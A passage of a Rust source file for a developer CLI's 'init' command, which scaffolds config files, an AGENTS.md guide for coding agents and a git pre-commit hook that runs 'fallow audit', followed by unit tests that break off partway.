use std::path::Path;
use std::process::ExitCode;

use fallow_config::{ExternalPluginDef, FallowConfig, PackageJson};
use fallow_core::git_env::clear_ambient_git_env;

use crate::validate;

const AGENTS_GUIDE_FILENAME: &str = "AGENTS.md";
/// Static template used as the ground truth for the empty-project case and
/// regression tests. Production code uses `build_agents_guide` instead.
#[cfg(test)]
const AGENTS_GUIDE_TEMPLATE: &str = r"# AGENTS.md

This file gives coding agents project-specific context. Keep it short and update it when workflows change.

## Project Overview

- Primary app or package:
- Main entry points:
- Important directories:

## Architecture Notes

- Module boundaries:
- Generated or vendored code:
- Sensitive areas:

## Commands

- Install:
- Build:
- Test:
- Typecheck or lint:

## Fallow

- Use `fallow audit --format json --quiet` before committing AI-generated changes.
- Use `fallow dead-code --format json --quiet`, `fallow dupes --format json --quiet`, and `fallow health --format json --quiet` for targeted checks.
- Use `fallow list --entry-points --format json --quiet` and `fallow list --boundaries --format json --quiet` to inspect project shape.

## Agent Rules

- Do not edit:
- Always ask before:
- Preferred style:
";

/// Detected project characteristics used to tailor config scaffolding.
pub struct ProjectInfo {
    pub is_monorepo: bool,
    pub workspace_patterns: Vec<String>,
    pub workspace_tool: Option<String>,
    pub has_typescript: bool,
    pub test_framework: Option<String>,
    pub ui_framework: Option<String>,
    pub has_storybook: bool,
    /// Canonical package manager parsed from the `packageManager` field in
    /// `package.json` (the part before `@`, e.g. `"pnpm@9.1.0"` gives `pnpm`).
    pub package_manager: Option<String>,
    /// True when more than one of vitest / jest / @playwright/test is present
    /// in the dependency name set. When true, `test_framework` holds the
    /// first-match value but the AGENTS.md scaffold leaves `- Test:` blank
    /// to avoid a confident mislabel.
    pub test_framework_ambiguous: bool,
}

/// Inspect the project root and detect frameworks, workspace setup, etc.
pub fn detect_project(root: &Path) -> ProjectInfo {
    let is_pnpm = root.join("pnpm-workspace.yaml").exists();
    let has_typescript = root.join("tsconfig.json").exists();
    let has_storybook = root.join(".storybook").is_dir();

    let pkg = PackageJson::load(&root.join("package.json")).ok();

    let pkg_workspace_patterns = pkg
        .as_ref()
        .map(|p| p.workspace_patterns())
        .unwrap_or_default();
    let has_npm_workspaces = !pkg_workspace_patterns.is_empty();

    let is_monorepo = is_pnpm || has_npm_workspaces;
    let workspace_patterns = if is_pnpm && pkg_workspace_patterns.is_empty() {
        read_pnpm_workspace_patterns(root)
    } else {
        pkg_workspace_patterns
    };

    let workspace_tool = if is_pnpm {
        Some("pnpm".to_string())
    } else if has_npm_workspaces {
        if root.join("yarn.lock").exists() {
            Some("yarn".to_string())
        } else {
            Some("npm".to_string())
        }
    } else {
        None
    };

    let all_deps = pkg
        .as_ref()
        .map(PackageJson::all_dependency_names)
        .unwrap_or_default();

    let has_vitest = all_deps.iter().any(|d| d == "vitest");
    let has_jest = all_deps.iter().any(|d| d == "jest");
    let has_playwright = all_deps.iter().any(|d| d == "@playwright/test");
    let test_framework_count = u8::from(has_vitest) + u8::from(has_jest) + u8::from(has_playwright);
    let test_framework_ambiguous = test_framework_count > 1;

    let test_framework = if has_vitest {
        Some("Vitest".to_string())
    } else if has_jest {
        Some("Jest".to_string())
    } else if has_playwright {
        Some("Playwright".to_string())
    } else {
        None
    };

    let ui_framework = if all_deps.iter().any(|d| d == "react" || d == "react-dom") {
        Some("React".to_string())
    } else if all_deps.iter().any(|d| d == "vue") {
        Some("Vue".to_string())
    } else if all_deps.iter().any(|d| d == "svelte") {
        Some("Svelte".to_string())
    } else if all_deps.iter().any(|d| d == "@angular/core") {
        Some("Angular".to_string())
    } else {
        None
    };

    // Extract just the manager name from `packageManager` (e.g. "pnpm@9.1.0" -> "pnpm").
    let package_manager = pkg
        .as_ref()
        .and_then(|p| p.package_manager.as_deref())
        .and_then(|pm| pm.split('@').next())
        .filter(|s| !s.is_empty())
        .map(str::to_owned);

    ProjectInfo {
        is_monorepo,
        workspace_patterns,
        workspace_tool,
        has_typescript,
        test_framework,
        ui_framework,
        has_storybook,
        package_manager,
        test_framework_ambiguous,
    }
}

/// Read workspace patterns from `pnpm-workspace.yaml`.
fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
    let path = root.join("pnpm-workspace.yaml");
    let Ok(content) = std::fs::read_to_string(&path) else {
        return Vec::new();
    };
    let mut patterns = Vec::new();
    let mut in_packages = false;
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed == "packages:" {
            in_packages = true;
            continue;
        }
        if in_packages {
            if let Some(value) = trimmed.strip_prefix("- ") {
                let value = value.trim().trim_matches('\'').trim_matches('"');
                if !value.is_empty() {
                    patterns.push(value.to_string());
                }
            } else if !trimmed.is_empty() && !trimmed.starts_with('#') {
                break;
            }
        }
    }
    patterns
}

/// Build a JSON config string tailored to the detected project.
///
/// Used by `fallow init` (where this is the canonical scaffold) and by
/// `fallow fix`'s missing-config fallback (so the seed file produced when
/// auto-applying duplicate-export config rules matches what `fallow init`
/// would have written, framework detection and all).
#[expect(
    clippy::expect_used,
    reason = "init config is built from json literals and serializes infallibly"
)]
pub fn build_json_config(info: &ProjectInfo) -> String {
    let mut config = serde_json::json!({
        "$schema": "https://raw.githubusercontent.com/fallow-rs/fallow/main/schema.json",
    });

    add_json_entry_config(&mut config, info);
    add_json_workspace_config(&mut config, info);
    add_json_ignore_config(&mut config, info);
    add_json_rules_config(&mut config, info);

    let mut output = serde_json::to_string_pretty(&config)
        .expect("config built from json! literals is always serializable");
    insert_json_duplicates_template(&mut output);
    output.push('\n');
    output
}

fn json_entry_extensions(info: &ProjectInfo) -> &'static str {
    if info.has_typescript {
        "{ts,tsx,js,jsx}"
    } else {
        "{js,jsx,mjs}"
    }
}

fn add_json_entry_config(config: &mut serde_json::Value, info: &ProjectInfo) {
    let extensions = json_entry_extensions(info);
    config["entry"] = serde_json::json!([
        format!("src/index.{extensions}"),
        format!("src/main.{extensions}"),
    ]);
}

fn add_json_workspace_config(config: &mut serde_json::Value, info: &ProjectInfo) {
    if info.is_monorepo && !info.workspace_patterns.is_empty() {
        config["workspaces"] = serde_json::json!({
            "packages": info.workspace_patterns,
        });
    }
}

fn add_json_ignore_config(config: &mut serde_json::Value, info: &ProjectInfo) {
    let mut ignore = Vec::new();
    if info.has_storybook {
        ignore.push(".storybook/**");
    }
    if !ignore.is_empty() {
        config["ignorePatterns"] = serde_json::json!(ignore);
    }
}

fn add_json_rules_config(config: &mut serde_json::Value, info: &ProjectInfo) {
    let mut rules = serde_json::Map::new();
    if info.test_framework.is_some() {
        rules.insert("unused-dependencies".to_string(), serde_json::json!("warn"));
    }
    config["rules"] = serde_json::Value::Object(rules);
}

fn insert_json_duplicates_template(output: &mut String) {
    *output = output.replacen(
        "  \"rules\":",
        "  \"duplicates\": {\n    // Hide pair-only clones; focus on widespread copy-paste\n    // worth refactoring. Lower to 2 to report every duplicate pair.\n    \"minOccurrences\": 3\n    // Common additions (uncomment to enable):\n    // \"ignore\": [\n    //   \"**/lib/**\",          // for repos that publish transpiled output to lib/\n    //   \"**/legacy/**\",       // for repos with legacy-build artifacts\n    //   \"**/__generated__/**\", // Relay, GraphQL Code Generator\n    //   \"**/generated/**\"     // OpenAPI, Protobuf codegen\n    // ]\n  },\n  \"rules\":",
        1,
    );
}

/// Build an AGENTS.md guide string tailored to the detected project.
///
/// Prefill rules:
/// - `Primary app or package:` is always blank (human-judgment field).
/// - `Module boundaries:` is filled for monorepos only; the tool label uses
///   the same trust ladder as `Install:` (a lockfile-default-sniffed
///   yarn/npm `workspace_tool` stays unlabeled, e.g. a Bun workspace must
///   not read "npm workspaces").
/// - No UI-framework or Storybook lines (presence-based, misfire on peer deps).
/// - A provenance HTML comment is emitted under `## Commands` only when at
///   least one Commands line is prefilled.
/// - `Install:` from `package_manager` when Some; else from `workspace_tool`
///   when it is `pnpm` (driven by pnpm-workspace.yaml, reliable); else blank.
/// - `Test:` only when `test_framework` is Some AND not ambiguous; capitalized.
/// - `Typecheck or lint:` filled with `tsc --noEmit` only when `has_typescript`.
pub fn build_agents_guide(info: &ProjectInfo) -> String {
    // Determine prefilled Commands lines.
    let install_line = agents_install_line(info);
    let test_line = agents_test_line(info);
    let typecheck_line = if info.has_typescript {
        "tsc --noEmit".to_string()
    } else {
        String::new()
    };

    let any_commands_prefilled =
        !install_line.is_empty() || !test_line.is_empty() || !typecheck_line.is_empty();

    let provenance_comment = if any_commands_prefilled {
        "<!-- fallow init prefilled these from package.json; confirm before relying on them -->\n"
    } else {
        ""
    };

    let module_boundaries = agents_module_boundaries_line(info);

    format!(
        r"# AGENTS.md

This file gives coding agents project-specific context. Keep it short and update it when workflows change.

## Project Overview

- Primary app or package:
- Main entry points:
- Important directories:

## Architecture Notes

- Module boundaries:{module_boundaries_suffix}
- Generated or vendored code:
- Sensitive areas:

## Commands

{provenance_comment}- Install:{install_suffix}
- Build:
- Test:{test_suffix}
- Typecheck or lint:{typecheck_suffix}

## Fallow

- Use `fallow audit --format json --quiet` before committing AI-generated changes.
- Use `fallow dead-code --format json --quiet`, `fallow dupes --format json --quiet`, and `fallow health --format json --quiet` for targeted checks.
- Use `fallow list --entry-points --format json --quiet` and `fallow list --boundaries --format json --quiet` to inspect project shape.

## Agent Rules

- Do not edit:
- Always ask before:
- Preferred style:
",
        module_boundaries_suffix = if module_boundaries.is_empty() {
            String::new()
        } else {
            format!(" {module_boundaries}")
        },
        provenance_comment = provenance_comment,
        install_suffix = if install_line.is_empty() {
            String::new()
        } else {
            format!(" {install_line}")
        },
        test_suffix = if test_line.is_empty() {
            String::new()
        } else {
            format!(" {test_line}")
        },
        typecheck_suffix = if typecheck_line.is_empty() {
            String::new()
        } else {
            format!(" {typecheck_line}")
        },
    )
}

/// Compute the `Install:` value for the AGENTS.md Commands section.
///
/// Prefers `package_manager` (canonical field in package.json), falls back to
/// `workspace_tool == "pnpm"` (inferred from pnpm-workspace.yaml). Never
/// emits a lockfile-sniffed `yarn install`/`npm install` to avoid false
/// labelling.
fn agents_install_line(info: &ProjectInfo) -> String {
    if let Some(pm) = &info.package_manager {
        return format!("{pm} install");
    }
    if info.workspace_tool.as_deref() == Some("pnpm") {
        return "pnpm install".to_string();
    }
    String::new()
}

/// Compute the `Test:` value for the AGENTS.md Commands section.
///
/// Returns the capitalized framework name only when exactly one framework is
/// detected. Returns an empty string when the framework is ambiguous or absent.
fn agents_test_line(info: &ProjectInfo) -> String {
    if info.test_framework_ambiguous {
        return String::new();
    }
    info.test_framework.clone().unwrap_or_default()
}

/// Compute the `Module boundaries:` suffix for the Architecture Notes section.
///
/// Returns a string like `pnpm workspaces (packages/*, apps/*)` for monorepos,
/// or an empty string for non-monorepos. The tool label follows the same trust
/// ladder as [`agents_install_line`]: the `packageManager` field, then pnpm
/// (driven by pnpm-workspace.yaml). The lockfile-default-sniffed yarn/npm
/// values of `workspace_tool` are NOT used, because they confidently mislabel
/// e.g. Bun workspaces (package.json `workspaces` + bun.lock) as
/// "npm workspaces"; those emit the tool-neutral `workspaces (...)` form.
fn agents_module_boundaries_line(info: &ProjectInfo) -> String {
    if !info.is_monorepo || info.workspace_patterns.is_empty() {
        return String::new();
    }
    let patterns = info.workspace_patterns.join(", ");
    let tool = info
        .package_manager
        .as_deref()
        .or_else(|| (info.workspace_tool.as_deref() == Some("pnpm")).then_some("pnpm"));
    match tool {
        Some(tool) => format!("{tool} workspaces ({patterns})"),
        None => format!("workspaces ({patterns})"),
    }
}

/// Build a TOML config string tailored to the detected project.
fn build_toml_config(info: &ProjectInfo) -> String {
    let mut lines = vec![
        "# fallow.toml - Codebase analysis configuration".to_string(),
        "# See https://docs.fallow.tools for documentation".to_string(),
        String::new(),
    ];

    let extensions = if info.has_typescript {
        "{ts,tsx,js,jsx}"
    } else {
        "{js,jsx,mjs}"
    };
    lines.push(format!(
        "entry = [\"src/index.{extensions}\", \"src/main.{extensions}\"]"
    ));

    if info.has_storybook {
        lines.push("ignorePatterns = [\".storybook/**\"]".to_string());
    }

    lines.push(String::new());

    if info.is_monorepo && !info.workspace_patterns.is_empty() {
        lines.push("[workspaces]".to_string());
        let patterns_str: Vec<String> = info
            .workspace_patterns
            .iter()
            .map(|p| format!("\"{p}\""))
            .collect();
        lines.push(format!("packages = [{}]", patterns_str.join(", ")));
        lines.push(String::new());
    }

    lines.push("[duplicates]".to_string());
    lines.push(
        "# Hide pair-only clones; focus on widespread copy-paste worth refactoring.".to_string(),
    );
    lines.push("# Lower to 2 to report every duplicate pair.".to_string());
    lines.push("minOccurrences = 3".to_string());
    lines.push("# Common additions (uncomment to enable):".to_string());
    lines.push("# ignore = [".to_string());
    lines.push(
        "#   \"**/lib/**\",          # for repos that publish transpiled output to lib/"
            .to_string(),
    );
    lines.push("#   \"**/legacy/**\",       # for repos with legacy-build artifacts".to_string());
    lines.push("#   \"**/__generated__/**\", # Relay, GraphQL Code Generator".to_string());
    lines.push("#   \"**/generated/**\"     # OpenAPI, Protobuf codegen".to_string());
    lines.push("# ]".to_string());
    lines.push(String::new());

    lines.push(
        "# Per-issue-type severity: \"error\" (fail CI), \"warn\" (report only), \"off\" (ignore)"
            .to_string(),
    );
    lines.push("[rules]".to_string());
    if info.test_framework.is_some() {
        lines.push("unused-dependencies = \"warn\"".to_string());
    }

    lines.push(String::new());
    lines.join("\n")
}

/// Print a summary of what was detected.
fn print_detection_summary(info: &ProjectInfo) {
    let mut detections = Vec::new();

    let type_label = if info.has_typescript {
        "TypeScript"
    } else {
        "JavaScript"
    };
    if info.is_monorepo {
        let tool = info.workspace_tool.as_deref().unwrap_or("unknown");
        detections.push(format!("{type_label} monorepo ({tool})"));
    } else {
        detections.push(type_label.to_string());
    }

    let mut frameworks = Vec::new();
    if let Some(test) = &info.test_framework {
        frameworks.push(test.as_str());
    }
    if let Some(ui) = &info.ui_framework {
        frameworks.push(ui.as_str());
    }
    if info.has_storybook {
        frameworks.push("Storybook");
    }
    if !frameworks.is_empty() {
        detections.push(frameworks.join(", "));
    }

    for detection in &detections {
        eprintln!("  Detected: {detection}");
    }

    let mut customizations = Vec::new();
    if info.is_monorepo && !info.workspace_patterns.is_empty() {
        customizations.push("workspace patterns");
    }
    if info.has_storybook {
        customizations.push("framework ignore rules");
    }
    if info.test_framework.is_some() {
        customizations.push("test framework rules");
    }
    if !customizations.is_empty() {
        eprintln!("  Config includes {}", customizations.join(" and "));
    }
}

/// Options for the `init` command.
pub struct InitOptions<'a> {
    pub root: &'a Path,
    pub use_toml: bool,
    pub agents: bool,
    pub hooks: bool,
    pub branch: Option<&'a str>,
}

/// Options for installing a managed Git pre-commit hook.
pub struct GitHooksInstallOptions<'a> {
    pub root: &'a Path,
    pub branch: Option<&'a str>,
    pub dry_run: bool,
    pub force: bool,
}

/// Options for uninstalling a managed Git pre-commit hook.
pub struct GitHooksUninstallOptions<'a> {
    pub root: &'a Path,
    pub dry_run: bool,
    pub force: bool,
}

pub fn run_init(opts: &InitOptions<'_>) -> ExitCode {
    if opts.agents {
        return run_init_agents(opts.root);
    }
    if opts.hooks {
        return run_git_hooks_install(&GitHooksInstallOptions {
            root: opts.root,
            branch: opts.branch,
            dry_run: false,
            force: false,
        });
    }
    run_init_config(opts.root, opts.use_toml)
}

fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
    let existing_names = [
        ".fallowrc.json",
        ".fallowrc.jsonc",
        "fallow.toml",
        ".fallow.toml",
    ];
    for name in &existing_names {
        let path = root.join(name);
        if path.exists() {
            eprintln!("{name} already exists");
            return ExitCode::from(2);
        }
    }

    let info = detect_project(root);

    if use_toml {
        let config_path = root.join("fallow.toml");
        let config_content = build_toml_config(&info);
        if let Err(e) = std::fs::write(&config_path, config_content) {
            eprintln!("Error: Failed to write fallow.toml: {e}");
            return ExitCode::from(2);
        }
        eprintln!("Created fallow.toml");
    } else {
        let config_path = root.join(".fallowrc.json");
        let config_content = build_json_config(&info);
        if let Err(e) = std::fs::write(&config_path, config_content) {
            eprintln!("Error: Failed to write .fallowrc.json: {e}");
            return ExitCode::from(2);
        }
        eprintln!("Created .fallowrc.json");
    }

    print_detection_summary(&info);
    ensure_gitignore(root);

    ExitCode::SUCCESS
}

fn run_init_agents(root: &Path) -> ExitCode {
    let agents_path = root.join(AGENTS_GUIDE_FILENAME);
    if agents_path.exists() {
        eprintln!("{AGENTS_GUIDE_FILENAME} already exists");
        return ExitCode::from(2);
    }

    let info = detect_project(root);
    let guide = build_agents_guide(&info);
    if let Err(e) = std::fs::write(&agents_path, guide) {
        eprintln!("Error: Failed to write {AGENTS_GUIDE_FILENAME}: {e}");
        return ExitCode::from(2);
    }

    eprintln!("Created {AGENTS_GUIDE_FILENAME}");
    ExitCode::SUCCESS
}

/// Ensure `.fallow/` is listed in the project's `.gitignore`.
///
/// If `.gitignore` exists and already contains `.fallow` (with or without
/// trailing slash), this is a no-op. Otherwise the entry is appended (or
/// the file is created).
fn ensure_gitignore(root: &Path) {
    let gitignore_path = root.join(".gitignore");
    let existing = std::fs::read_to_string(&gitignore_path).unwrap_or_default();

    let already_ignored = existing.lines().any(|line| {
        let trimmed = line.trim();
        trimmed == ".fallow" || trimmed == ".fallow/"
    });

    if already_ignored {
        return;
    }

    let is_new = existing.is_empty();
    let entry = if is_new || existing.ends_with('\n') {
        ".fallow/\n"
    } else {
        "\n.fallow/\n"
    };

    let mut contents = existing;
    contents.push_str(entry);

    if let Err(e) = std::fs::write(&gitignore_path, contents) {
        eprintln!("Warning: Failed to update .gitignore: {e}");
        return;
    }

    if is_new {
        eprintln!("Created .gitignore with .fallow/ entry");
    } else {
        eprintln!("Added .fallow/ to .gitignore");
    }
}

/// Detect the default branch name by querying git.
fn detect_default_branch(root: &Path) -> Option<String> {
    let mut command = std::process::Command::new("git");
    command
        .args(["symbolic-ref", "refs/remotes/origin/HEAD"])
        .current_dir(root);
    clear_ambient_git_env(&mut command);
    let output = command.output().ok()?;
    if output.status.success() {
        let full_ref = String::from_utf8(output.stdout).ok()?;
        return full_ref
            .trim()
            .strip_prefix("refs/remotes/origin/")
            .map(String::from);
    }
    None
}

const GIT_HOOK_MARKER: &str = "# Generated by fallow hooks install --target git.";

/// Hint printed when an existing pre-commit hook prevents installation.
/// Mirrors the resolution block emitted by [`run_git_hooks_install`] so the
/// caller can paste it into their existing hook by hand.
fn existing_hook_hint(hook_path: &str, fallback_base_ref: &str) -> String {
    format!(
        r#"Error: {hook_path} already exists. Add the following block to your existing hook:

  command -v fallow >/dev/null 2>&1 || exit 0
  UPSTREAM="$(git rev-parse --abbrev-ref --symbolic-full-name '@{{upstream}}' 2>/dev/null || true)"
  if [ -n "$UPSTREAM" ]; then
    BASE="$(git merge-base "$UPSTREAM" HEAD 2>/dev/null || echo "$UPSTREAM")"
  else
    BASE="{fallback_base_ref}"
  fi
  fallow audit --base "$BASE" --quiet --gate-marker pre-commit"#
    )
}

/// Hint printed when Lefthook is the active hook manager. Embeds the same
/// resolution block as the standalone hook script under a `run: |` scalar.
fn lefthook_hint(fallback_base_ref: &str) -> String {
    format!(
        r#"Lefthook detected. Add the following to your lefthook.yml:

  pre-commit:
    commands:
      fallow:
        run: |
          command -v fallow >/dev/null 2>&1 || exit 0
          UPSTREAM="$(git rev-parse --abbrev-ref --symbolic-full-name '@{{upstream}}' 2>/dev/null || true)"
          if [ -n "$UPSTREAM" ]; then
            BASE="$(git merge-base "$UPSTREAM" HEAD 2>/dev/null || echo "$UPSTREAM")"
          else
            BASE="{fallback_base_ref}"
          fi
          fallow audit --base "$BASE" --quiet --gate-marker pre-commit"#
    )
}

enum HookTarget {
    Husky(std::path::PathBuf),
    Lefthook,
    GitHooks(std::path::PathBuf),
}

fn detect_hook_target(root: &Path) -> Result<HookTarget, ExitCode> {
    if root.join(".husky").is_dir() {
        Ok(HookTarget::Husky(root.join(".husky/pre-commit")))
    } else if root.join(".lefthook").is_dir()
        || root.join("lefthook.yml").exists()
        || root.join("lefthook.json").exists()
    {
        Ok(HookTarget::Lefthook)
    } else if root.join(".git/hooks").is_dir() {
        Ok(HookTarget::GitHooks(root.join(".git/hooks/pre-commit")))
    } else {
        eprintln!(
            "Error: No .git directory found. Run `git init` first, or use --hooks \
             from the repository root."
        );
        Err(ExitCode::from(2))
    }
}

pub fn run_git_hooks_install(opts: &GitHooksInstallOptions<'_>) -> ExitCode {
    let root = opts.root;
    let branch = opts.branch;

    if let Some(b) = branch
        && let Err(e) = validate::validate_git_ref(b)
    {
        eprintln!("Error: invalid --branch: {e}");
        return ExitCode::from(2);
    }

    let fallback_base_ref = branch
        .map(String::from)
        .or_else(|| detect_default_branch(root))
        .unwrap_or_else(|| "main".to_string());

    let hook_content = format!(
        r#"#!/bin/sh
{GIT_HOOK_MARKER}
# fallow pre-commit hook -- gate commits on dead code, complexity, and duplication.
# Audit defaults to gate=new-only, so inherited findings on touched files do not block
# commits; only findings introduced by the changeset fail the gate. Set audit.gate = "all"
# in fallow.toml to fail on every finding in changed files.
# Remove or edit this file to change the hook behavior.
# Bypass on a single commit with: git commit --no-verify

command -v fallow >/dev/null 2>&1 || exit 0
UPSTREAM="$(git rev-parse --abbrev-ref --symbolic-full-name '@{{upstream}}' 2>/dev/null || true)"
if [ -n "$UPSTREAM" ]; then
  # Diff against the merge-base with the upstream so feature branches forked off
  # a non-default integration branch (next-release / hotfix / LTS) compare
  # against the right base, not against their own remote tracking branch.
  BASE="$(git merge-base "$UPSTREAM" HEAD 2>/dev/null || echo "$UPSTREAM")"
else
  BASE="{fallback_base_ref}"
fi
fallow audit --base "$BASE" --quiet --gate-marker pre-commit
"#
    );

    let target = match detect_hook_target(root) {
        Ok(target) => target,
        Err(code) => return code,
    };

    match target {
        HookTarget::Husky(hook_path) => {
            let existed = hook_path.exists();
            if existed && !opts.force {
                eprintln!(
                    "{}",
                    existing_hook_hint(".husky/pre-commit", &fallback_base_ref)
                );
                return ExitCode::from(2);
            }
            if opts.dry_run {
                if existed {
                    eprintln!("Would overwrite .husky/pre-commit");
                } else {
                    eprintln!("Would create .husky/pre-commit");
                }
            } else if let Err(e) = write_hook(&hook_path, &hook_content) {
                eprintln!("Error: Failed to write .husky/pre-commit: {e}");
                return ExitCode::from(2);
            } else {
                eprintln!(
                    "{} .husky/pre-commit",
                    if existed { "Updated" } else { "Created" }
                );
            }
        }
        HookTarget::Lefthook => {
            eprintln!("{}", lefthook_hint(&fallback_base_ref));
            return ExitCode::SUCCESS;
        }
        HookTarget::GitHooks(hook_path) => {
            let existed = hook_path.exists();
            if existed && !opts.force {
                eprintln!(
                    "{}",
                    existing_hook_hint(".git/hooks/pre-commit", &fallback_base_ref)
                );
                return ExitCode::from(2);
            }
            if opts.dry_run {
                if existed {
                    eprintln!("Would overwrite .git/hooks/pre-commit");
                } else {
                    eprintln!("Would create .git/hooks/pre-commit");
                }
            } else if let Err(e) = write_hook(&hook_path, &hook_content) {
                eprintln!("Error: Failed to write .git/hooks/pre-commit: {e}");
                return ExitCode::from(2);
            } else {
                eprintln!(
                    "{} .git/hooks/pre-commit",
                    if existed { "Updated" } else { "Created" }
                );
            }
        }
    }

    eprintln!(
        "\nThe hook runs `fallow audit` against the merge-base with the current branch upstream, \
         falling back to `{fallback_base_ref}` when no upstream is set (gate=new-only by default)."
    );
    eprintln!("To skip the hook on a single commit: git commit --no-verify");
    ExitCode::SUCCESS
}

pub fn run_git_hooks_uninstall(opts: &GitHooksUninstallOptions<'_>) -> ExitCode {
    let target = match detect_hook_target(opts.root) {
        Ok(target) => target,
        Err(code) => return code,
    };

    let hook_path = match target {
        HookTarget::Husky(path) | HookTarget::GitHooks(path) => path,
        HookTarget::Lefthook => {
            eprintln!(
                "Lefthook detected. Remove the fallow command from your lefthook.yml manually."
            );
            return ExitCode::SUCCESS;
        }
    };

    if !hook_path.exists() {
        eprintln!(
            "{} unchanged (not present)",
            display_hook_path(opts.root, &hook_path)
        );
        return ExitCode::SUCCESS;
    }

    let content = match std::fs::read_to_string(&hook_path) {
        Ok(content) => content,
        Err(e) => {
            eprintln!(
                "Error: Failed to read {}: {e}",
                display_hook_path(opts.root, &hook_path)
            );
            return ExitCode::from(2);
        }
    };

    if !content.contains(GIT_HOOK_MARKER) && !opts.force {
        eprintln!(
            "Error: {} was not generated by fallow. Re-run with --force to remove it anyway.",
            display_hook_path(opts.root, &hook_path)
        );
        return ExitCode::from(2);
    }

    if opts.dry_run {
        eprintln!("Would remove {}", display_hook_path(opts.root, &hook_path));
        return ExitCode::SUCCESS;
    }

    if let Err(e) = std::fs::remove_file(&hook_path) {
        eprintln!(
            "Error: Failed to remove {}: {e}",
            display_hook_path(opts.root, &hook_path)
        );
        return ExitCode::from(2);
    }

    eprintln!("Removed {}", display_hook_path(opts.root, &hook_path));
    ExitCode::SUCCESS
}

fn display_hook_path(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .map_or_else(|_| path.display().to_string(), |p| p.display().to_string())
}

/// Write a hook file and set the executable permission on Unix.
fn write_hook(path: &Path, content: &str) -> std::io::Result<()> {
    std::fs::write(path, content)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(path)?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(path, perms)?;
    }
    Ok(())
}

pub fn run_config_schema() -> ExitCode {
    let schema = FallowConfig::json_schema();
    match serde_json::to_string_pretty(&schema) {
        Ok(json) => {
            println!("{json}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("Error: failed to serialize schema: {e}");
            ExitCode::from(2)
        }
    }
}

pub fn run_plugin_schema() -> ExitCode {
    let schema = ExternalPluginDef::json_schema();
    match serde_json::to_string_pretty(&schema) {
        Ok(json) => {
            println!("{json}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("Error: failed to serialize plugin schema: {e}");
            ExitCode::from(2)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config_opts(root: &Path, use_toml: bool) -> InitOptions<'_> {
        InitOptions {
            root,
            use_toml,
            agents: false,
            hooks: false,
            branch: None,
        }
    }

    fn agents_opts(root: &Path) -> InitOptions<'_> {
        InitOptions {
            root,
            use_toml: false,
            agents: true,
            hooks: false,
            branch: None,
        }
    }

    fn hooks_opts<'a>(root: &'a Path, branch: Option<&'a str>) -> InitOptions<'a> {
        InitOptions {
            root,
            use_toml: false,
            agents: false,
            hooks: true,
            branch,
        }
    }

    fn parse_jsonc_config(content: &str) -> serde_json::Value {
        jsonc_parser::parse_to_serde_value(content, &jsonc_parser::ParseOptions::default())
            .expect("parse generated jsonc")
    }

    #[test]
    fn init_creates_json_config_by_default() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::SUCCESS);
        let path = root.join(".fallowrc.json");
        assert!(path.exists());
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("$schema"));
        assert!(content.contains("rules"));
    }

    #[test]
    fn init_creates_toml_config_when_requested() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&config_opts(root, true));
        assert_eq!(exit, ExitCode::SUCCESS);
        let path = root.join("fallow.toml");
        assert!(path.exists());
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("fallow.toml"));
        assert!(content.contains("entry"));
        assert!(content.contains("[rules]"));
    }

    #[test]
    fn init_fails_if_fallowrc_json_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".fallowrc.json"), "{}").unwrap();
        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn init_fails_if_fallow_toml_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join("fallow.toml"), "").unwrap();
        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn init_fails_if_dot_fallow_toml_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".fallow.toml"), "").unwrap();
        let exit = run_init(&config_opts(root, true));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn init_json_config_is_valid_jsonc() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
        let parsed = parse_jsonc_config(&content);
        assert!(parsed.is_object());
        assert!(parsed["$schema"].is_string());
        assert!(content.contains("// Common additions (uncomment to enable):"));
    }

    #[test]
    fn init_json_template_writes_min_occurrences_three() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
        let parsed = parse_jsonc_config(&content);
        assert_eq!(
            parsed["duplicates"]["minOccurrences"], 3,
            "fresh installs default minOccurrences to 3 to hide pair-only noise"
        );
    }

    #[test]
    fn init_toml_template_writes_min_occurrences_three() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, true));
        let content = std::fs::read_to_string(root.join("fallow.toml")).unwrap();
        assert!(
            content.contains("minOccurrences = 3"),
            "fresh installs default minOccurrences to 3 to hide pair-only noise"
        );
    }

    #[test]
    fn init_toml_does_not_create_json() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, true));
        assert!(!root.join(".fallowrc.json").exists());
        assert!(root.join("fallow.toml").exists());
    }

    #[test]
    fn init_json_does_not_create_toml() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, false));
        assert!(!root.join("fallow.toml").exists());
        assert!(root.join(".fallowrc.json").exists());
    }

    #[test]
    fn init_existing_config_blocks_both_formats() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
